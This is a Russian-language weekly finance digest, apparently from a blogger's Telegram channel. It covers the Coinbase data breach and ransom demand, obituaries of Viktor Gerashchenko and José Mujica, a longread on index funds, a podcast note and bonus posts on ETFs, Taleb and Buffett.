🐌 Биржу Coinbase взломали и украли данные 1% пользователей (около 1 млн человек). Как заявили в компании, мошенники потребовали выкуп в размере $20 млн за то, чтобы не публиковать эту информацию (там в основном всякие фото документов, к самим аккаунтам получить доступ у них не удалось) – думаю, криптаны в этом случае сильнее всего переживают, как бы налоговая не заинтересовалась базой данных. Как бы то ни было, биржа платить такие деньги отказалась, и пообещала награду в эквивалентном размере тем, кто сдаст злоумышленников и поможет их как-нибудь поймать.
RIP недели: Геращенко и Мухика
🐌 Ушел из жизни бывший глава Центробанка Виктор Геращенко. Он дважды возглавлял Госбанк СССР и ЦБ РФ и подал в отставку в 2002 году. В частности, он помог замутить пару денежных реформ в 1991 и 1993 – и в обеих как-то так получилось, что население страны слегка обеднело. (И вот еще интересно про всё это пишет Дмитрий Травин.)
Виктор Геращенко раздает автографы после своей отставки, 2002
🐌 Умер бывший президент Уругвая Хосе Мухика, которого называли «самым бедным президентом мира» из-за его скромного образа жизни. Он отказался от президентского дворца, живя в маленьком фермерском домике, и водил старенький Фольксваген Жук 1987 года.
Лонгрид недели
🐌 Написал текст про скрытые неэффективности индексных фондов, и как инвестор может их избежать. Там довольно интересно про то, есть ли более интересная альтернатива уже привычным нам классическим «пассивным фондам от Vanguard».
Интервью недели
🐌 В этой рубрике рассказываю об одном подкасте, который я послушал на прошлой неделе. Нынче это подкаст Masters in Business с Эдвардом Ченселлором. Как обычно, подробнее рассказываю свои мысли в видеоверсии дайджеста, а также вот тут на своем втором канале.
Хорошая новость недели
🐌 На прошлой неделе не удалось обнаружить ни одной хорошей новости. Вся надежда на вас – напишите в комментах, чё хорошего случилось!!
Держите утешительный мем – помог чем мог… 
Бонусные посты недели из моих ТГ-каналов
🐌 Разбираем налоговые нюансы дивидендов внутри ETF на акции (там не всё так просто, как вы думали!).
🐌 Нассим Талеб ненавидит концепцию IQ: разбираемся, прав он или нет (там есть интересная ПРИЧИНА).
🐌 Чем Баффет лучше Байдена: дед, которого мы заслужили."
